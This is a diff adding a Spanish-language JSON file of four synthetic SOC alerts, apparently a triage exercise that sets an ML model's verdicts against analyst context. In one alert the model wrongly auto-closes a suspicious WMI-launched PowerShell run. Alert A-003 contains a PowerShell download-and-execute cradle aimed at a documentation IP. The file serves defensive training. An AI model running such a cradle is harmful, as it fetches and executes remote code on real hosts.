@@ -1,0 +1,130 @@
+[alerts.json](https://github.com/user-attachments/files/35396335/alerts.json)[
+  {
+    "id": "A-001",
+    "title": "PowerShell ejecutado por tarea programada en servidor de respaldo",
+    "timestamp": "2026-03-14T02:00:07",
+    "model_view": {
+      "command_summary": "powershell.exe -NoProfile -File pre-job.ps1",
+      "ti_matches": 0,
+      "similar_past_alerts": 212,
+      "similarity": 0.99
+    },
+    "model_verdict": {
+      "label": "benigno",
+      "confidence": 0.97,
+      "suggestion": "auto-cierre",
+      "reason": "Idéntica a 212 alertas previas cerradas como ruido"
+    },
+    "analyst_context": {
+      "host": "BKP-SRV-02",
+      "host_criticality": "baja",
+      "account": "svc_backup",
+      "account_type": "servicio",
+      "account_usual_hours": "01:00-04:00",
+      "parent_process": "backupagent.exe",
+      "process": "powershell.exe",
+      "command_line": "powershell.exe -NoProfile -File \"C:\\Program Files\\BackupAgent\\scripts\\pre-job.ps1\"",
+      "notes": [
+        "El script está firmado por el proveedor del agente de respaldo",
+        "Se ejecuta todas las noches a la misma hora desde hace meses"
+      ]
+    }
+  },
+  {
+    "id": "A-002",
+    "title": "PowerShell con comando codificado lanzado por agente de despliegue",
+    "timestamp": "2026-03-14T23:40:51",
+    "model_view": {
+      "command_summary": "powershell.exe -NoProfile -EncodedCommand <base64>",
+      "ti_matches": 0,
+      "similar_past_alerts": 4,
+      "similarity": 0.58
+    },
+    "model_verdict": {
+      "label": "sospechoso",
+      "confidence": 0.61,
+      "suggestion": "revisar",
+      "reason": "Comando codificado fuera de horario laboral, pocas alertas similares"
+    },
+    "analyst_context": {
+      "host": "WS-IT-114",
+      "host_criticality": "media",
+      "account": "svc_deploy",
+      "account_type": "servicio",
+      "account_usual_hours": "22:00-02:00",
+      "parent_process": "deploy-agent.exe",
+      "process": "powershell.exe",
+      "command_line": "powershell.exe -NoProfile -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAGwAYQBiAC0AZABlAG0AbwAtAGEAMAAwADIAIgA=",
+      "change_ticket": "CHG-20931 (aprobado, ventana 23:00-01:00)",
+      "notes": [
+        "El ticket de cambio cubre este host y esta ventana",
+        "El comando decodificado solo escribe un texto en consola"
+      ]
+    }
+  },
+  {
+    "id": "A-003",
+    "title": "Documento de Office lanza PowerShell que descarga un script",
+    "timestamp": "2026-03-15T10:21:33",
+    "model_view": {
+      "command_summary": "powershell.exe -w hidden -nop -c IEX(DownloadString(<url>))",
+      "ti_matches": 3,
+      "similar_past_alerts": 0,
+      "similarity": 0.12
+    },
+    "model_verdict": {
+      "label": "malicioso",
+      "confidence": 0.99,
+      "suggestion": "escalar",
+      "reason": "Cadena Office → PowerShell con descarga desde IP marcada en inteligencia de amenazas"
+    },
+    "analyst_context": {
+      "host": "WS-FIN-031",
+      "host_criticality": "media",
+      "account": "mrodriguez",
+      "account_type": "usuario",
+      "account_usual_hours": "08:00-18:00",
+      "parent_process": "winword.exe",
+      "process": "powershell.exe",
+      "command_line": "powershell.exe -w hidden -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/a.ps1')\"",
+      "notes": [
+        "El documento llegó por correo hace 4 minutos",
+        "La IP 203.0.113.50 es de documentación (TEST-NET-3): dato sintético"
+      ]
+    }
+  },
+  {
+    "id": "A-004",
+    "title": "EDR-48213: PowerShell oculto lanzado por WMI en servidor de finanzas",
+    "timestamp": "2026-03-16T03:12:09",
+    "model_view": {
+      "command_summary": "powershell.exe -w hidden -enc <base64>",
+      "ti_matches": 0,
+      "similar_past_alerts": 37,
+      "similarity": 0.91
+    },
+    "model_verdict": {
+      "label": "benigno",
+      "confidence": 0.94,
+      "suggestion": "auto-cierre",
+      "reason": "Similar a 37 falsos positivos previos de herramientas de administración"
+    },
+    "analyst_context": {
+      "host": "FIN-DB-07",
+      "host_criticality": "alta",
+      "account": "svc_reporting",
+      "account_type": "servicio",
+      "account_usual_hours": "08:00-18:00",
+      "parent_process": "wmiprvse.exe",
+      "process": "powershell.exe",
+      "command_line": "powershell.exe -w hidden -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAGwAYQBiAC0AZABlAG0AbwAtAGEAMAAwADQAIgA=",
+      "notes": [
+        "wmiprvse.exe como proceso padre indica ejecución remota por WMI",
+        "La cuenta de servicio nunca había trabajado a las 03:12",
+        "No hay ticket de cambio asociado"
+      ]
+    }
+  }
+]
+
+
